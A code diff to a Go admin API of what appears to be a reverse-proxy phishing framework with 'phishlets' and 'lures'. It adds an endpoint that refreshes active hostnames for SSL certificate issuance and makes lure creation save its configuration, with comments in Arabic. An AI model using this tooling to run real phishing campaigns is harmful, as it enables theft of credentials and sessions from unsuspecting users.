@@ -117,6 +117,7 @@ func (as *ApiServer) Start() {
 	authorized.HandleFunc("/phishlets/{name}/disable", as.phishletDisableHandler).Methods("POST")
 	authorized.HandleFunc("/configs/hostname", as.hostnameConfigHandler).Methods("POST")
 	authorized.HandleFunc("/config/save", as.configSaveHandler).Methods("POST")
+	authorized.HandleFunc("/config/certificates", as.certificatesHandler).Methods("POST")
 	authorized.HandleFunc("/lures", as.luresHandler).Methods("GET", "POST")
 	authorized.HandleFunc("/lures/{id:[0-9]+}", as.lureHandler).Methods("GET", "DELETE")
 	authorized.HandleFunc("/lures/{id:[0-9]+}/enable", as.lureEnableHandler).Methods("POST")
@@ -906,6 +907,12 @@ func (as *ApiServer) luresHandler(w http.ResponseWriter, r *http.Request) {
 		
 		lure, _ = as.cfg.GetLure(lureIndex)
 		
+		// تحديث قائمة hostnames النشطة للتأكد من أن النطاق الجديد مدرج
+		as.cfg.refreshActiveHostnames()
+		
+		// حفظ التكوين لضمان استمرار التغييرات عند إعادة تشغيل البرنامج
+		as.cfg.SavePhishlets()
+		
 		as.jsonResponse(w, ApiResponse{
 			Success: true,
 			Message: fmt.Sprintf("Created lure with ID: %d", lureIndex),
@@ -1252,6 +1259,23 @@ func (as *ApiServer) configSaveHandler(w http.ResponseWriter, r *http.Request) {
 	as.jsonResponse(w, ApiResponse{
 		Success: true,
 		Message: "تم حفظ التكوين بنجاح",
+	})
+}
+
+// إضافة معالج تحديث شهادات SSL
+func (as *ApiServer) certificatesHandler(w http.ResponseWriter, r *http.Request) {
+	// تحديث قائمة hostnames النشطة
+	as.cfg.refreshActiveHostnames()
+	
+	// الحصول على قائمة الـ hostnames النشطة
+	active_hosts := as.cfg.GetActiveHostnames("")
+	
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم تحديث شهادات SSL بنجاح. يرجى الانتظار لبضع دقائق لإصدار الشهادات.",
+		Data: map[string]interface{}{
+			"active_hostnames": active_hosts,
+		},
 	})
 }
 
